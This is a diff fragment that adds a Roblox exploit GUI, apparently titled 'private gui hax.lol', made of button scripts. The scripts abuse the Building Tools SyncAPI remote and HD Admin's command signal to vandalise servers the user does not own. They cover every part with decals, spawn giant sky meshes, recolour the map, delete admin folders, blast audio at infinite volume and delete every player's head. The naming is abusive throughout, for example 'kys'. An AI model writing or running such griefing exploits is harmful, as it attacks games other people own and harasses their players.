+			ohno({"SyncMesh", {{Part = part, Scale = scaleVal}}})
+		end
+	
+		local function weldParts(partA, partB, leader)
+			ohno({"CreateWelds", {partA, partB}, leader})
+		end
+	
+		local function lockPart(part, bool)
+			ohno({"SetLocked", {part}, bool})
+		end
+	
+		local function setTransparency(part, val)
+			ohno({"SyncMaterial", {{Part = part, Transparency = val}}})
+		end
+	
+		local function addSpotlight(part)
+			ohno({"CreateLights", {{Part = part, LightType = "SpotLight"}}})
+		end
+	
+		local function setLightBrightness(part, brightness)
+			ohno({"SyncLighting", {{Part = part, LightType = "SpotLight", Brightness = brightness}}})
+		end
+	
+		local function recolorPart(part, colorVal)
+			ohno({"SyncColor", {{Part = part, Color = colorVal, UnionColoring = false}}})
+		end
+	
+		local function spawnDecalOnFace(part, side)
+			ohno({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
+		end
+	
+		local function addDecalToFace(part, assetId, side)
+			ohno({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. assetId}}})
+		end
+	
+		for i = 1, #allParts do
+			setTransparency(allParts[i], 0)
+		end
+	end)
+end;
+task.spawn(C_39);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_3b()
+local script = G2L["3b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			call({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		task.spawn(function() call({ "SyncAnchor", { { Part = sky, Anchored = true } } }) end)
+		task.spawn(function() call({ "SyncCollision", { { Part = sky, CanCollide = false } } }) end)
+		task.spawn(function() call({ "CreateMeshes", { { Part = sky } } }) end)
+		task.spawn(function()
+			call({
+				"SyncMesh",
+				{{
+					Part = sky,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://10760076480",
+					Scale = Vector3.new(100999, 100999, 100999),
+					VertexColor = Vector3.new(4.5, 4.5, 4.5)
+				}}
+			})
+		end)
+		task.spawn(function() call({ "SetLocked", { sky }, true }) end)
+		task.spawn(function() call({ "SetName", { sky }, "kys" }) end)
+		task.spawn(function() call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } }) end)
+		task.spawn(function() call({ "SyncMove", { { Part = sky, CFrame = cf } } }) end)
+	end)
+end;
+task.spawn(C_3b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_3d()
+local script = G2L["3d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- method task.spawn by yoid and 1sw0rd1
+		-- credit to theses 2
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local decalID = "10760076480"
+		local id = decalID
+	
+		local player = Players.LocalPlayer
+	
+		local tool = nil
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local allParts = {}
+		for _, v in pairs(Workspace:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				table.insert(allParts, v)
+			end
+		end
+	
+		local faces = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local faceEnums = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, faceName in pairs(faces) do
+			task.spawn(function()
+				local faceEnum = faceEnums[faceName]
+				local createList = {}
+				local addList = {}
+				for i = 1, #allParts do
+					local part = allParts[i]
+					createList[i] = {Part = part, Face = faceEnum, TextureType = "Decal"}
+					addList[i] = {Part = part, Face = faceEnum, TextureType = "Decal", Texture = "rbxassetid://" .. id}
+				end
+				remote:InvokeServer('CreateTextures', createList)
+				remote:InvokeServer('SyncTexture', addList)
+			end)
+		end
+	
+		local function send(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function setCollision(part, bool)
+			task.spawn(function() send({"SyncCollision", {{Part = part, CanCollide = bool}}}) end)
+		end
+	
+		local function setAnchor(bool, part)
+			task.spawn(function() send({"SyncAnchor", {{Part = part, Anchored = bool}}}) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.spawn(function() send({"CreatePart", "Normal", cf, parent}) end)
+		end
+	
+		local function killPart(part)
+			task.spawn(function() send({"Remove", {part}}) end)
+		end
+	
+		local function movePart(part, cf)
+			task.spawn(function() send({"SyncMove", {{Part = part, CFrame = cf}}}) end)
+		end
+	
+		local function resizePart(part, sz, cf)
+			task.spawn(function() send({"SyncResize", {{Part = part, CFrame = cf, Size = sz}}}) end)
+		end
+	
+		local function addMeshToPart(part)
+			task.spawn(function() send({"CreateMeshes", {{Part = part}}}) end)
+		end
+	
+		local function changeMesh(part, meshId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshId}}}) end)
+		end
+	
+		local function changeTexture(part, texId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texId}}}) end)
+		end
+	
+		local function renamePart(part, newName)
+			task.spawn(function() send({"SetName", {part}, newName}) end)
+		end
+	
+		local function scaleMesh(part, scaleVal)
+			task.spawn(function() send({"SyncMesh", {{Part = part, Scale = scaleVal}}}) end)
+		end
+	
+		local function weldParts(partA, partB, leader)
+			task.spawn(function() send({"CreateWelds", {partA, partB}, leader}) end)
+		end
+	
+		local function lockPart(part, bool)
+			task.spawn(function() send({"SetLocked", {part}, bool}) end)
+		end
+	
+		local function setTransparency(part, val)
+			task.spawn(function() send({"SyncMaterial", {{Part = part, Transparency = val}}}) end)
+		end
+	
+		local function addSpotlight(part)
+			task.spawn(function() send({"CreateLights", {{Part = part, LightType = "SpotLight"}}}) end)
+		end
+	
+		local function setLightBrightness(part, brightness)
+			task.spawn(function() send({"SyncLighting", {{Part = part, LightType = "SpotLight", Brightness = brightness}}}) end)
+		end
+	
+		local function recolorPart(part, colorVal)
+			task.spawn(function() send({"SyncColor", {{Part = part, Color = colorVal, UnionColoring = false}}}) end)
+		end
+	
+		local function spawnDecalOnFace(part, side)
+			task.spawn(function() send({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}}) end)
+		end
+	
+		local function addDecalToFace(part, assetId, side)
+			task.spawn(function() send({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. assetId}}}) end)
+		end
+	
+		for i = 1, #allParts do
+			task.spawn(setTransparency, allParts[i], 0)
+		end
+	end)
+end;
+task.spawn(C_3d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_3f()
+local script = G2L["3f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+	
+		local tool
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		if not tool then
+			return
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local fuckskids = {}
+		for _, part in pairs(Workspace:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name ~= "Terrain" and part.Name ~= "kys" then
+				for _, decal in pairs(part:GetChildren()) do
+					if decal:IsA("Decal") then
+						fuckskids[#fuckskids + 1] = decal
+					end
+				end
+			end
+		end
+	
+		for i = 1, #fuckskids do
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer("Remove", { fuckskids[i] })
+				end)
+			end)
+		end
+	
+		local function RemoveTextures()
+			local parts = {}
+			for _, part in pairs(Workspace:GetDescendants()) do
+				if part:IsA("BasePart") and part.Name ~= "Terrain" and part.Name ~= "kys" then
+					parts[#parts + 1] = part
+				end
+			end
+	
+			local removeList = {}
+			local faces = { Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Right, Enum.NormalId.Left, Enum.NormalId.Bottom, Enum.NormalId.Top }
+			for _, Part in pairs(parts) do
+				for _, face in pairs(faces) do
+					removeList[#removeList + 1] = { Part = Part, Face = face, TextureType = "Decal" }
+				end
+			end
+	
+			if #removeList > 0 then
+				pcall(function()
+					remote:InvokeServer('CreateTextures', removeList)
+				end)
+			end
+		end
+	
+		task.wait(0.5)
+		RemoveTextures()
+	end)
+end;
+task.spawn(C_3f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_41()
+local script = G2L["41"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local function getf3x()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local tool = getf3x()
+		if not tool then return end
+	
+		local r = tool.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		local parts = {}
+		for _, v in pairs(ws:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				parts[#parts + 1] = v
+			end
+		end
+	
+		for i = 1, #parts do
+			local v = parts[i]
+			task.spawn(function()
+				local color = Color3.new(math.random(), math.random(), math.random())
+				call("SyncColor", { { Part = v, Color = color, UnionColoring = false } })
+				call("SyncMaterial", { { Part = v, Material = Enum.Material.Neon } })
+			end)
+		end
+	end)
+end;
+task.spawn(C_41);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_43()
+local script = G2L["43"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer 
+		local char = player.Character
+		local tool
+	
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+	
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function DestroyFolder(folder)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = folder
+				}
+			}
+			_(args)
+		end
+	
+		local folderToRemove = workspace:FindFirstChild("HDAdminWorkspaceFolder")
+		if folderToRemove then
+			DestroyFolder(folderToRemove)
+		end
+	end)
+end;
+task.spawn(C_43);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_45()
+local script = G2L["45"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommandSilent:InvokeServer(";sound 127916720193602 ;volume inf ;pitch 2.75")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		char:WaitForChild("HumanoidRootPart")
+	
+		local function ohno(func)
+			task.defer(function()
+				pcall(func)
+			end)
+		end
+	
+		ohno(function()
+			RequestCommand:InvokeServer(";fogcolor black ;unfog ;time 0")
+		end)
+	
+		local tool
+		for _,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then tool = v.Parent end
+		end
+		if not tool then
+			for _,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then tool = v.Parent end
+			end
+		end
+		local remote = tool.SyncAPI.ServerEndpoint
+		local RunService = game:GetService("RunService")
+		local function _(args) remote:InvokeServer(unpack(args)) end
+		local function CreatePart(cf,parent) _( {"CreatePart","Normal",cf,parent} ) end
+		local function SetAnchor(part,bool) _( {"SyncAnchor",{ {Part=part,Anchored=bool} } } ) end
+		local function AddMesh(part) _( {"CreateMeshes",{ {Part=part} } } ) end
+		local function SetMesh(part,meshid,vertexColor) _( {"SyncMesh",{ {Part=part,MeshId="rbxassetid://"..meshid,VertexColor=vertexColor or Vector3.new(1,1,1)} } } ) end
+		local function SetTexture(part,texid) _( {"SyncMesh",{ {Part=part,TextureId=texid} } } ) end
+		local function MeshResize(part,size) _( {"SyncMesh",{ {Part=part,Scale=size} } } ) end
+		local function SetTransparency(part,value) _( {"SyncTransparency",{ {Part=part,Transparency=value} } } ) end
+		local function DestroyPart(part) _( {"Remove",{part}} ) end
+		local function SetName(part,name) _( {"SetName",{part},name} ) end
+	
+		local skyInstance = workspace:FindFirstChild("kys")
+		if skyInstance then
+			ohno(function()
+				_( {"Remove",{skyInstance}} )
+			end)
+		end
+	
+		local images = {
+			"http://www.roblox.com/asset/?id=169585459",
+			"http://www.roblox.com/asset/?id=169585475",
+			"http://www.roblox.com/asset/?id=169585485",
+			"http://www.roblox.com/asset/?id=169585502",
+			"http://www.roblox.com/asset/?id=169585515",
+			"http://www.roblox.com/asset/?id=169585502",
+			"http://www.roblox.com/asset/?id=169585485",
+			"http://www.roblox.com/asset/?id=169585475"
+		}
+	
+		local skyPart
+		local skyLoop
+		local frameTime = 0.25
+		local lastUpdate = 0
+	
+		local function CreateSky()
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+			local cf = CFrame.new(hrp.Position + Vector3.new(0,1000,0))
+			local sky = remote:InvokeServer("CreatePart","Normal",cf,workspace)
+			ohno(function() SetAnchor(sky,true) end)
+			ohno(function() SetName(sky,"kys") end)
+			ohno(function() AddMesh(sky) end)
+			ohno(function() SetMesh(sky,"111891702759441",Vector3.new(3.6,3.6,3.6)) end)
+			ohno(function() MeshResize(sky,Vector3.new(100999,100999,100999)) end)
+			ohno(function() SetTransparency(sky,0) end)
+			ohno(function() _( {"SyncCollision",{ {Part=sky,CanCollide=false} } } ) end)
+			ohno(function() _( {"SetLocked",{sky},true} ) end)
+			skyPart = sky
+			local index = 1
+			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
+				lastUpdate = lastUpdate + deltaTime
+				if lastUpdate >= frameTime then
+					lastUpdate = 0
+					if not skyPart then
+						skyLoop:Disconnect()
+						return
+					end
+					ohno(function() SetTexture(skyPart,images[index]) end)
+					index = (index % #images) + 1
+				end
+			end)
+		end
+	
+		local function ResetSky()
+			if skyLoop then skyLoop:Disconnect(); skyLoop=nil end
+			if skyPart then DestroyPart(skyPart); skyPart=nil end
+			ohno(CreateSky)
+		end
+	
+		player.CharacterAdded:Connect(function(newChar)
+			char=newChar
+			ResetSky()
+		end)
+	
+		if char and char:FindFirstChild("Humanoid") then
+			char:WaitForChild("Humanoid").Died:Connect(function()
+				ResetSky()
+			end)
+		end
+	
+		ohno(CreateSky)
+	end)
+end;
+task.spawn(C_45);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_47()
+local script = G2L["47"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		char:WaitForChild("HumanoidRootPart")
+	
+		local function ohno(func)
+			task.defer(function()
+				pcall(func)
+			end)
+		end
+	
+		ohno(function()
+			RequestCommand:InvokeServer(";fogcolor black ;unfog ;time 0")
+		end)
+	
+		local tool
+		for _,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then tool = v.Parent end
+		end
+		if not tool then
+			for _,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then tool = v.Parent end
+			end
+		end
+		local remote = tool.SyncAPI.ServerEndpoint
+		local RunService = game:GetService("RunService")
+		local function _(args) remote:InvokeServer(unpack(args)) end
+		local function CreatePart(cf,parent) _( {"CreatePart","Normal",cf,parent} ) end
+		local function SetAnchor(part,bool) _( {"SyncAnchor",{ {Part=part,Anchored=bool} } } ) end
+		local function AddMesh(part) _( {"CreateMeshes",{ {Part=part} } } ) end
+		local function SetMesh(part,meshid,vertexColor) _( {"SyncMesh",{ {Part=part,MeshId="rbxassetid://"..meshid,VertexColor=vertexColor or Vector3.new(1,1,1)} } } ) end
+		local function SetTexture(part,texid) _( {"SyncMesh",{ {Part=part,TextureId=texid} } } ) end
+		local function MeshResize(part,size) _( {"SyncMesh",{ {Part=part,Scale=size} } } ) end
+		local function SetTransparency(part,value) _( {"SyncTransparency",{ {Part=part,Transparency=value} } } ) end
+		local function DestroyPart(part) _( {"Remove",{part}} ) end
+		local function SetName(part,name) _( {"SetName",{part},name} ) end
+	
+		local skyInstance = workspace:FindFirstChild("kys")
+		if skyInstance then
+			ohno(function()
+				_( {"Remove",{skyInstance}} )
+			end)
+		end
+	
+		local images = {
+			"http://www.roblox.com/asset/?id=169585459",
+			"http://www.roblox.com/asset/?id=169585475",
+			"http://www.roblox.com/asset/?id=169585485",
+			"http://www.roblox.com/asset/?id=169585502",
+			"http://www.roblox.com/asset/?id=169585515",
+			"http://www.roblox.com/asset/?id=169585502",
+			"http://www.roblox.com/asset/?id=169585485",
+			"http://www.roblox.com/asset/?id=169585475"
+		}
+	
+		local skyPart
+		local skyLoop
+		local frameTime = 0.25
+		local lastUpdate = 0
+	
+		local function CreateSky()
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+			local cf = CFrame.new(hrp.Position + Vector3.new(0,1000,0))
+			local sky = remote:InvokeServer("CreatePart","Normal",cf,workspace)
+			ohno(function() SetAnchor(sky,true) end)
+			ohno(function() SetName(sky,"kys") end)
+			ohno(function() AddMesh(sky) end)
+			ohno(function() SetMesh(sky,"111891702759441",Vector3.new(3.6,3.6,3.6)) end)
+			ohno(function() MeshResize(sky,Vector3.new(100999,100999,100999)) end)
+			ohno(function() SetTransparency(sky,0) end)
+			ohno(function() _( {"SyncCollision",{ {Part=sky,CanCollide=false} } } ) end)
+			ohno(function() _( {"SetLocked",{sky},true} ) end)
+			skyPart = sky
+			local index = 1
+			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
+				lastUpdate = lastUpdate + deltaTime
+				if lastUpdate >= frameTime then
+					lastUpdate = 0
+					if not skyPart then
+						skyLoop:Disconnect()
+						return
+					end
+					ohno(function() SetTexture(skyPart,images[index]) end)
+					index = (index % #images) + 1
+				end
+			end)
+		end
+	
+		local function ResetSky()
+			if skyLoop then skyLoop:Disconnect(); skyLoop=nil end
+			if skyPart then DestroyPart(skyPart); skyPart=nil end
+			ohno(CreateSky)
+		end
+	
+		player.CharacterAdded:Connect(function(newChar)
+			char=newChar
+			ResetSky()
+		end)
+	
+		if char and char:FindFirstChild("Humanoid") then
+			char:WaitForChild("Humanoid").Died:Connect(function()
+				ResetSky()
+			end)
+		end
+	
+		ohno(CreateSky)
+	end)
+end;
+task.spawn(C_47);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_49()
+local script = G2L["49"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = workspace.Part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function KillAll()
+			for i,v in game.Players:GetPlayers() do
+				spawn(function()
+					SetLocked(v.Character.Head,false)
+					DestroyPart(v.Character.Head)
+				end)
+			end
+		end
+		KillAll()
+	end)
+end;
+task.spawn(C_49);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_4b()
+local script = G2L["4b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- avatar mesh statue f3x script by snakeGod aka morceeeeeeeeeee
+		-- no skiddy skiddy here!
+	
+		local Player = game.Players.LocalPlayer
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local tool
+	
+		for _, v in pairs(Player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+	
+		for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function Invoke(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function makeit()
+			local char = Player.Character or Player.CharacterAdded:Wait()
+			local hrp = char:WaitForChild("HumanoidRootPart")
+			local cf = hrp.CFrame * CFrame.new(0, 8.5, -6)
+	
+			Invoke({"CreatePart", "Normal", cf, workspace})
+	
+			task.wait(0.05)
+	
+			for _, v in pairs(workspace:GetChildren()) do
+				if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 2 then
+	
+					Invoke({"SetName", {v}, "Statue"})
+	
+					Invoke({"CreateMeshes", {{
+						Part = v
+					}}})
+	
+					Invoke({"SyncMesh", {{
+						Part = v,
+						MeshId = "rbxassetid://139100404372149",
+						TextureId = "rbxassetid://117491592664686",
+						Scale = Vector3.new(4,4,4)
+					}}})
+	
+					Invoke({"SyncAnchor", {{
+						Part = v,
+						Anchored = true
+					}}})
+	
+					break
+				end
+			end
+		end
+	
+		makeit()
+	end)
+end;
+task.spawn(C_4b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_4d()
+local script = G2L["4d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			call({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		task.spawn(function() call({ "SyncAnchor", { { Part = sky, Anchored = true } } }) end)
+		task.spawn(function() call({ "SyncCollision", { { Part = sky, CanCollide = false } } }) end)
+		task.spawn(function() call({ "CreateMeshes", { { Part = sky } } }) end)
+		task.spawn(function()
+			call({
+				"SyncMesh",
+				{{
+					Part = sky,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://100091122003498",
+					Scale = Vector3.new(100999, 100999, 100999),
+					VertexColor = Vector3.new(4.5, 4.5, 4.5)
+				}}
+			})
+		end)
+		task.spawn(function() call({ "SetLocked", { sky }, true }) end)
+		task.spawn(function() call({ "SetName", { sky }, "kys" }) end)
+		task.spawn(function() call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } }) end)
+		task.spawn(function() call({ "SyncMove", { { Part = sky, CFrame = cf } } }) end)
+	end)
+end;
+task.spawn(C_4d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_4f()
+local script = G2L["4f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- method task.spawn by yoid and 1sw0rd1
+		-- credit to theses 2
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local decalID = "100091122003498"
+		local id = decalID
+	
+		local player = Players.LocalPlayer
+	
+		local tool = nil
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local allParts = {}
+		for _, v in pairs(Workspace:GetDescendants()) do
